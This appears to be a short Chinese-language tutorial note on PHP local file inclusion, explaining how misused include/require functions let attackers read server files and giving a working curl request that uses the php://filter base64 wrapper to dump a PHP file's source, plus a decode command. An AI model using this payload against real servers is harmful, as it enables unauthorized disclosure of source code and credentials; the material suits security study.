### LFI（local file inclusion）漏洞是.php文件里include、require、once等函数不恰当使用引起的

这个漏洞允许攻击者暴露目标服务器上的文件，在目录遍历（../）的帮助下，可以使攻击者访问本不应该访问到的文件。

但有时候也并不能直接看到代码，这是因为脚本的保护

这里介绍用base64加密的方法来bypass脚本的保护，用“ php://filter ”来把文件加密为base64的格式

```
curl -s http://test.com/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/test/test.php
```
接着再把用base64加密的部分解密出来就行了

```
echo "test_in_base64" | sudo base64 -d
```

就可以看到原本不允许看的test.php的源代码了
